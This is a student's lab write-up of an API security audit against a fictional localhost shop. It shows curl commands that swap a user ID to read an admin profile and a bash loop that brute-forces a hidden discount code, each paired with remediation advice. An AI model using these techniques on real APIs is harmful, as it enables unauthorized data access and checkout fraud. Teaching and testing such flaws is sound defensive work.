# 📡 The Invisible Logic — API Security Audit

> **Course:** Cybersecurity Operations | Week 9 · Session 27
> **Type:** Web Application Security Lab — API Exploitation & Business Logic Flaws
> **Environment:** Kali Linux · Burp Suite Community · Python Flask REST API

---

## 📋 Overview

This lab simulates a real-world black-box API security assessment against "Titan Shop," a fictional e-commerce REST API. The objective was to identify and exploit two critical vulnerabilities:

1. **BOLA** (Broken Object Level Authorization) — accessing private admin data by manipulating a user ID in the API endpoint
2. **Business Logic Flaw** — brute-forcing a hidden discount code buried in the checkout logic

Both vulnerabilities are consistently ranked in the **OWASP API Security Top 10**, making this lab directly applicable to real penetration testing engagements.

---

## 🧰 Tools & Technologies

| Tool | Purpose |
|---|---|
| **Burp Suite Community** | HTTP proxy for intercepting and manipulating API requests |
| **curl** | Command-line HTTP client for direct API interaction |
| **Python Flask** | Backend framework powering the Titan Shop API |
| **Bash scripting** | Automated brute-force loop for discount code discovery |

---

## 🌐 Target Environment

| Component | Details |
|---|---|
| API Base URL | `http://127.0.0.1:5000` |
| Profile Endpoint | `GET /api/v1/profile/{id}` |
| Checkout Endpoint | `POST /api/v1/checkout` |
| Standard User | ID: `101` — `user@titan.com` |
| Admin Target | ID: `102` — `boss@titan.com` (CISO) |

---

## ⚙️ Phase 1 — BOLA: The ID Swap

### Vulnerability
**Broken Object Level Authorization (BOLA / IDOR)**
The API accepts a user-supplied ID in the URL and returns the corresponding profile without verifying whether the requesting user is authorized to access it.

### Attack Performed

**Normal request — own profile:**
```bash
curl http://127.0.0.1:5000/api/v1/profile/101
```
```json
{"email":"user@titan.com","name":"Standard User","role":"User"}
```

**BOLA attack — swapped ID to access admin profile:**
```bash
curl http://127.0.0.1:5000/api/v1/profile/102
```
```json
{
  "email": "boss@titan.com",
  "name": "CISO",
  "role": "Admin",
  "secret": "TITAN_MASTER_KEY_2026"
}
```

### Result ✅
By changing a single digit in the URL (`101` → `102`), full access to the CISO's private profile was obtained — including a sensitive secret field never intended to be exposed to regular users.

### Remediation
- Implement server-side authorization checks that verify the authenticated user owns the requested resource
- Never rely on user-supplied IDs without verifying ownership via session token
- Apply the principle of least privilege — regular users should never receive admin-level fields in any response

---

## ⚙️ Phase 2 — Business Logic Flaw: The Discount Hunter

### Vulnerability
**Insufficient Brute-Force Protection on Business Logic Endpoint**
The checkout API accepted sequential numeric discount codes with no rate limiting, lockout mechanism, or unpredictability — allowing automated enumeration of valid codes.

### Attack Performed

A sequential bash loop tested all codes from `9900` to `9999` against the checkout endpoint:

```bash
for i in $(seq 9900 9999); do
  result=$(curl -s -X POST http://127.0.0.1:5000/api/v1/checkout \
  -H "Content-Type: application/json" \
  -d "{\"discount_code\": \"$i\"}"); \
  echo "$i: $result"; \
done | grep -v '"discount":"0%"'
```

### Result ✅
```
9912: {"discount":"100% OFF","status":"Success","total":"$0.00"}
```

Code `9912` was identified as the valid hidden discount code, returning a **100% discount** and reducing the total to `$0.00`.

### Remediation
- Implement **rate limiting** on the checkout endpoint to block rapid sequential requests
- Use **cryptographically random** discount codes instead of predictable sequential numbers
- Set **short expiry windows** on all discount codes
- Add **account lockout** after a defined number of failed discount attempts
- Log and alert on unusual checkout activity patterns

---

## 🧠 Concepts Demonstrated

| Concept | Description |
|---|---|
| **BOLA / IDOR** | Exploiting missing authorization on object-level API endpoints |
| **Business Logic Flaw** | Abusing predictable discount code structure to gain unauthorized discounts |
| **API Enumeration** | Probing endpoints to understand the attack surface |
| **Automated Brute Force** | Using scripted HTTP requests to enumerate valid values |
| **Security Audit Reporting** | Documenting findings and remediation in a structured audit log |

---

## 📊 OWASP API Security Top 10 Coverage

| OWASP Risk | Covered in This Lab |
|---|---|
| API1:2023 — Broken Object Level Authorization | ✅ Phase 1 |
| API4:2023 — Unrestricted Resource Consumption | ✅ Phase 2 |

---

## 📄 Artifact

**File:** `api_audit.log`
**Contains:**
- CISO secret extracted via BOLA: `TITAN_MASTER_KEY_2026`
- Hidden discount code discovered: `9912`
- Remediation recommendations for both vulnerabilities

---

## ⚠️ Legal Disclaimer

> This lab was performed in a controlled, isolated educational environment.
> All targets were intentionally vulnerable applications provisioned for this course.
> No real systems were accessed. This work is intended solely for educational purposes.

---

## 👤 Author

**wendkali**
Cybersecurity Student | Web Application & API Security Track
_Portfolio Repository — API Security Lab Series_